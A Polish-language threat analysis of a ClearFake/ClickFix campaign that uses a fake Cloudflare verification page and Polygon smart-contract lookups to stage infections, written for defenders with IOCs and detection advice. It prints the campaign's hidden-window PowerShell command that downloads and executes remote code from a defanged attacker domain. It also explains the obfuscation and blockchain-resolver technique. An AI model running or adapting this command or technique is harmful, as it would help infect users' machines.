# ClearFake i ClickFix z wykorzystaniem Polygon RPC — analiza łańcucha infekcji

Kampanie typu ClickFix coraz częściej łączą klasyczną socjotechnikę z technikami, które utrudniają szybkie zidentyfikowanie i zablokowanie infrastruktury atakującego. Jednym z takich mechanizmów jest wykorzystanie publicznych węzłów blockchain RPC oraz smart contractów do dynamicznego przechowywania konfiguracji kampanii.

Podczas analizy jednej ze skompromitowanych stron zidentyfikowałem mechanizm charakterystyczny dla kampanii ClearFake i ClickFix. Strona wyświetlała fałszywy panel weryfikacyjny stylizowany na usługę Cloudflare i próbowała nakłonić użytkownika do ręcznego uruchomienia komendy PowerShell.

Istotnym elementem tej kampanii było wykorzystanie sieci Polygon. Publiczne węzły Polygon RPC służyły jako warstwa pośrednia, za pomocą której złośliwy JavaScript odczytywał ze smart contractu aktualny adres infrastruktury następnego etapu ataku.

## Łańcuch działania kampanii

Analizowany łańcuch infekcji wyglądał następująco:

```text
wejście na skompromitowaną stronę
        ↓
wykonanie obfuskowanego JavaScriptu
        ↓
zapytanie do publicznych węzłów Polygon RPC
        ↓
odczyt konfiguracji ze smart contractu
        ↓
pobranie adresu backendu kampanii
        ↓
wyświetlenie fałszywego panelu Cloudflare
        ↓
nakłonienie użytkownika do uruchomienia PowerShella
```

Punktem wejścia była legalna, lecz prawdopodobnie skompromitowana strona.

Po wejściu na stronę użytkownikowi wyświetlany był ekran przypominający mechanizm weryfikacyjny Cloudflare. Zawierał komunikaty podobne do:

```text
Human Verification
Complete the steps below
Perform the steps on your keyboard
```
<img width="756" height="375" alt="fake-cloudflare-verification" src="https://github.com/user-attachments/assets/4265f94f-2bff-4fc1-8333-be3c6d33740e" />

*Rysunek 1. Fałszywy mechanizm weryfikacyjny wykorzystywany w kampanii ClickFix.*

Nie była to jednak prawdziwa weryfikacja CAPTCHA. Był to mechanizm socjotechniczny ClickFix.

## Czym jest technika ClickFix?

ClickFix polega na przekonaniu użytkownika, że musi samodzielnie wykonać określone działania w celu rozwiązania rzekomego problemu technicznego, przejścia weryfikacji lub odblokowania strony.

Najczęściej użytkownik otrzymuje instrukcję, aby:

1. otworzyć okno „Uruchom” za pomocą skrótu `Windows + R`,
2. wkleić zawartość znajdującą się w schowku,
3. nacisnąć klawisz Enter.

W rzeczywistości strona wcześniej umieszcza w schowku komendę PowerShell lub inną komendę systemową. Użytkownik staje się więc osobą, która bezpośrednio uruchamia pierwszy etap infekcji.

Takie podejście może pozwolić atakującym ominąć część mechanizmów bezpieczeństwa opartych wyłącznie na automatycznym pobieraniu i uruchamianiu plików przez przeglądarkę.

## Komenda PowerShell prezentowana użytkownikowi

W analizowanym wariancie kampanii fałszywa weryfikacja przygotowywała następującą komendę:

```powershell
powershell -w h "iex(irm 'idverification-cdn[.]info/e91c170d84482cdb' -UseBasicParsing)"; exit <#Verification ID: e91c170d84482cdb#>
```

Komenda składa się z kilku charakterystycznych elementów.

### `powershell -w h`

Parametr `-w h` jest skróconą formą ustawienia trybu ukrytego okna:

```powershell
-WindowStyle Hidden
```

Powoduje to uruchomienie PowerShella bez widocznego dla użytkownika okna konsoli.

### `irm`

Polecenie `irm` jest aliasem dla:

```powershell
Invoke-RestMethod
```

W tym przypadku służyło do pobrania zawartości ze zdalnego serwera:

```text
idverification-cdn[.]info/e91c170d84482cdb
```

### `iex`

Polecenie `iex` jest aliasem dla:

```powershell
Invoke-Expression
```

Jego zadaniem jest wykonanie pobranej zawartości jako kodu PowerShell.

Cały mechanizm można uprościć do następującego schematu:

```text
pobierz skrypt z Internetu
        ↓
przekaż jego zawartość do Invoke-Expression
        ↓
wykonaj kod bezpośrednio w pamięci procesu PowerShell
```

Nie oznacza to, że na żadnym etapie ataku nie mogą zostać zapisane pliki na dysku. Pierwszy etap może jednak zostać wykonany bez klasycznego pobrania widocznego pliku instalacyjnego.

## Obfuskowany JavaScript osadzony na stronie

W kodzie źródłowym strony znajdował się obfuskowany skrypt JavaScript umieszczony pomiędzy markerami:

```html
<!-- wpmbchik -->
...
<!-- /wpmbchik -->
```

<img width="1058" height="197" alt="obfuscated-javascript" src="https://github.com/user-attachments/assets/1ca4cd56-9468-4f96-8ce7-8a1a8f4444e8" />
*Rysunek 2. Fałszywy mechanizm weryfikacyjny wykorzystywany w kampanii ClickFix.*

Skrypt zawierał tablicę wartości liczbowych. Dane były dekodowane za pomocą operacji XOR z wartością `30`, a następnie uruchamiane dynamicznie przy użyciu konstrukcji:

```javascript
new Function(...)
```

Konstrukcja `new Function()` pozwala utworzyć funkcję na podstawie ciągu tekstowego. W tym przypadku utrudniała analizę statyczną, ponieważ właściwa logika programu nie była bezpośrednio widoczna w kodzie HTML.

Dopiero po zdeobfuskowaniu możliwe było odtworzenie głównych etapów działania skryptu.

Złośliwy JavaScript:

1. sprawdzał, czy został już wykonany w danej sesji przeglądarki,
2. definiował identyfikator kampanii,
3. przygotowywał listę publicznych węzłów Polygon RPC,
4. wysyłał zapytanie `eth_call` do wskazanego smart contractu,
5. odczytywał z odpowiedzi adres infrastruktury następnego etapu,
6. ładował kolejny skrypt z endpointu `/api.php?s=<campaign_id>`.

W analizowanej próbce identyfikator kampanii miał wartość:

```text
a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402
```

## Polygon RPC jako warstwa pośrednia

<img width="747" height="609" alt="polygon-rpc" src="https://github.com/user-attachments/assets/353985b7-2078-4775-bd1d-590a8fbcde2c" />

*Rysunek 3. Publiczne węzły Polygon RPC powizane z smart contract.*

Jednym z najciekawszych elementów kampanii było wykorzystanie publicznych węzłów Polygon RPC.

RPC, czyli Remote Procedure Call, umożliwia aplikacjom komunikowanie się z węzłem blockchain. Za jego pomocą można między innymi odczytywać stan sieci, sprawdzać dane smart contractów oraz wysyłać transakcje.

W analizowanym przypadku przeglądarka nie wykonywała transakcji finansowej. Wysyłała odczytowe zapytanie JSON-RPC typu:

```text
eth_call
```

Zapytanie kierowane było do smart contractu:

```text
0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2
```

Wykorzystywany selektor funkcji:

```text
b68d1809
```

Mechanizm działania wyglądał następująco:

```text
przeglądarka użytkownika
        ↓
publiczny węzeł Polygon RPC
        ↓
zapytanie eth_call
        ↓
smart contract
        ↓
odczyt aktualnego adresu backendu kampanii
        ↓
załadowanie /api.php?s=<campaign_id>
```

W tym modelu smart contract pełnił funkcję dynamicznego resolvera infrastruktury. Zamiast umieszczać docelową domenę bezpośrednio w każdym skrypcie osadzonym na skompromitowanych stronach, operatorzy mogli publikować lub aktualizować ją w jednym miejscu.

Dzięki temu zmiana backendu nie wymagała ponownego modyfikowania wszystkich przejętych stron.

## Czy zapytania ofiar są widoczne w Polygonscan?

To ważne rozróżnienie.

Zapytania `eth_call` mają charakter odczytowy. Nie zmieniają stanu blockchaina i nie są zapisywane jako standardowe transakcje on-chain.

Oznacza to, że ruch urządzenia ofiary do publicznego węzła RPC nie musi być widoczny w eksploratorze Polygonscan jako osobna transakcja.

Transakcje widoczne przy analizie wskazanego kontraktu mogą reprezentować przede wszystkim aktywność jego operatorów, na przykład:

* publikowanie nowej konfiguracji,
* zmianę adresu infrastruktury,
* aktualizowanie wartości przechowywanych przez kontrakt,
* utrzymanie mechanizmu wykorzystywanego przez kampanię.

Nie należy więc automatycznie interpretować każdego adresu wykonującego transakcję z kontraktem jako urządzenia ofiary.

## Infrastruktura następnego etapu

W analizowanym przypadku kolejnym elementem infrastruktury była domena:

```text
idverification-cdn[.]info
```

W kodzie strony znajdowało się odwołanie do endpointu:

```text
hxxps[://]idverification-cdn[.]info/api[.]php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402
```

Ta sama domena była następnie wykorzystywana w komendzie PowerShell prezentowanej użytkownikowi przez fałszywy panel weryfikacyjny.

Wskazuje to, że infrastruktura obsługiwała co najmniej dwa elementy kampanii:

* dostarczenie skryptu odpowiedzialnego za wyświetlenie mechanizmu ClickFix,
* udostępnienie zawartości pobieranej i wykonywanej przez PowerShell.

## Wskaźniki techniczne

### Skompromitowana strona

```text
Redacted
```

### Infrastruktura następnego etapu

```text
idverification-cdn[.]info
```

### Publiczne węzły Polygon RPC wykorzystane przez skrypt

```text
polygon[.]drpc[.]org
polygon[.]lava[.]build
polygon-bor-rpc[.]publicnode[.]com
polygon-mainnet[.]gateway[.]tatum[.]io
polygon-public[.]nodies[.]app
polygon[.]gateway[.]tenderly[.]co
polygon[.]rpc[.]hypersync[.]xyz
polygon[.]therpc[.]io
```

### Smart contract

```text
0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2
```

### Selektor funkcji

```text
b68d1809
```

### Identyfikator kampanii

```text
a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402
```

### Marker w kodzie HTML

```html
<!-- wpmbchik -->
```

### Flaga JavaScript

```javascript
window['_6b30bec11f']
```

### Charakterystyczny wzorzec PowerShell

```powershell
powershell -w h "iex(irm 'idverification-cdn[.]info/<verification_id>' -UseBasicParsing)"
```

## Publiczne węzły Polygon nie są samodzielnymi IOC

Obecność komunikacji z domenami Polygon RPC nie oznacza automatycznie infekcji.

Publiczne endpointy RPC są wykorzystywane przez legalne aplikacje, portfele kryptowalutowe, rozwiązania Web3, serwisy finansowe i narzędzia analityczne. Zablokowanie wszystkich takich domen bez uwzględnienia kontekstu może prowadzić do licznych fałszywych alarmów i zakłóceń w działaniu legalnych usług.

W analizowanym przypadku o złośliwym charakterze zdarzenia świadczyło dopiero połączenie wielu elementów:

* wejście na skompromitowaną stronę,
* obecność obfuskowanego JavaScriptu,
* wykorzystanie smart contractu jako resolvera infrastruktury,
* ładowanie kodu z domeny `idverification-cdn[.]info`,
* wyświetlenie fałszywego panelu Cloudflare,
* przygotowanie komendy wykorzystującej `IEX` i `IRM`,
* próba nakłonienia użytkownika do ręcznego uruchomienia PowerShella.

To pełny kontekst zdarzenia, a nie pojedyncze połączenie sieciowe, pozwala zaklasyfikować stronę jako element rzeczywistej kampanii ClickFix.

## Dlaczego taki mechanizm jest skuteczny?

Kampania łączy kilka technik, które zwiększają jej odporność na analizę i blokowanie.

### Kompromitacja legalnej strony

Użytkownik może zaufać stronie, ponieważ działa ona w legalnej domenie i wcześniej mogła mieć poprawną reputację.

### Obfuskacja JavaScriptu

Właściwa logika jest ukryta w zakodowanych wartościach i tworzona dopiero w czasie wykonywania.

### Wykorzystanie publicznej infrastruktury RPC

Ruch kierowany jest do legalnych i powszechnie dostępnych usług, których całkowite zablokowanie może być niepraktyczne.

### Dynamiczna konfiguracja w smart contractcie

Adres backendu może być zmieniany bez aktualizowania kodu na każdej skompromitowanej stronie.

### Podszywanie się pod Cloudflare

Znany wygląd panelu weryfikacyjnego zwiększa wiarygodność komunikatu.

### Ręczne wykonanie polecenia przez użytkownika

Zamiast wykorzystywać klasyczne automatyczne pobieranie, kampania przekonuje użytkownika do samodzielnego uruchomienia komendy.

## Możliwości detekcji

Skuteczna detekcja takiej kampanii nie powinna opierać się wyłącznie na domenach publicznych węzłów RPC.

Większą wartość mogą mieć korelacje obejmujące:

* uruchomienie `powershell.exe` przez `explorer.exe`,
* użycie parametrów ukrywających okno PowerShella,
* obecność `Invoke-Expression` lub aliasu `iex`,
* obecność `Invoke-RestMethod` lub aliasu `irm`,
* uruchomienie PowerShella krótko po odwiedzeniu podejrzanej strony,
* zawartość schowka kopiowaną przez skrypt przeglądarki,
* połączenia do świeżo zarejestrowanych lub niskoreputacyjnych domen,
* żądania do ścieżek takich jak `/api.php?s=<campaign_id>`,
* odwołania JSON-RPC do określonego kontraktu i selektora funkcji,
* wystąpienie markera `wpmbchik` w kodzie stron.

Szczególnie wartościowe będzie połączenie telemetrii przeglądarki, procesu PowerShell oraz ruchu sieciowego w jednym krótkim przedziale czasowym.

## Podsumowanie

Analizowany przypadek był rzeczywistą ekspozycją na kampanię ClearFake i ClickFix, a nie detekcj False Positive wynikającą wyłącznie z komunikacji z legalnymi domenami Polygon RPC.

Najistotniejszym elementem technicznym było wykorzystanie smart contractu jako dynamicznego źródła konfiguracji kampanii. Publiczne węzły RPC pozwalały złośliwemu JavaScriptowi odczytać aktualny adres infrastruktury następnego etapu.

Następnie użytkownikowi prezentowano fałszywy panel Cloudflare, którego zadaniem było nakłonienie go do ręcznego uruchomienia komendy PowerShell pobierającej i wykonującej zdalny kod.

Przypadek ten pokazuje, że infrastruktura blockchain może być wykorzystywana nie tylko do płatności czy transferowania środków, ale również jako odporna i dynamiczna warstwa dystrybucji konfiguracji złośliwych kampanii.

Z perspektywy zespołów bezpieczeństwa kluczowe znaczenie ma analiza całego łańcucha zdarzeń. Sam ruch do Polygon RPC nie jest wystarczającym dowodem kompromitacji. Dopiero korelacja z kodem strony, zachowaniem przeglądarki, infrastrukturą następnego etapu i uruchomieniem PowerShella pozwala poprawnie ocenić charakter aktywności.

## Informacja
Niniejsza publikacja została przygotowana w celach edukacyjnych, badawczych oraz rozwoju zawodowego. Przedstawia obserwacje techniczne, zastosowane metody i wnioski oparte na materiałach dostępnych w momencie prowadzenia analizy.

Publikacja nie zawiera danych osobowych, danych uwierzytelniających, prywatnej korespondencji, wewnętrznej telemetrii, informacji poufnych ani zastrzeżonych, a także szczegółów infrastruktury charakterystycznych dla konkretnej organizacji. Wszelkie wrażliwe informacje kontekstowe zostały pominięte lub zanonimizowane. Publiczne wskaźniki techniczne zostały uwzględnione wyłącznie tam, gdzie były istotne dla analizy, oraz odpowiednio zdezaktywowane.

O ile nie wskazano wyraźnie inaczej, publikacja nie identyfikuje źródła, właściciela, podmiotu, którego dotyczy analiza, ani okoliczności, w których analizowany materiał został pozyskany lub zaobserwowany. Przedstawione ustalenia odzwierciedlają dostępne dowody oraz zakres przyjęty dla danej analizy.
